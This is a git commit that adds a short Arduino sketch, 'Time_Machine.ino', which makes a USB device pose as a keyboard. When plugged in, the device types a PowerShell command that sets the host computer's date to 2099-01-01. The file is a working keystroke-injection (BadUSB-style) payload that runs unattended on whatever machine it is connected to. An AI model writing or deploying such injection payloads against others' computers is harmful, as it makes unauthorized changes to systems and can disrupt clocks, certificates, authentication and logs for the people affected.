d7ee954508a40f1dafabfc99ebc649b7666f7931
mohsen akhavan <77884120+mohsenakhavan@users.noreply.github.com>
2025-02-08 22:58:02 +0330

    Create Time_Machine.ino

---
+++ sketches/Time_Machine.ino
@@ -0,0 +1,8 @@
+#include <USBHIDKeyboard.h>
+USBHIDKeyboard Keyboard;
+
+void setup() {
+  Keyboard.begin();
+  delay(3000);
+  Keyboard.println(F("powershell -c \"Set-Date -Date '2099-01-01'\""));
+}
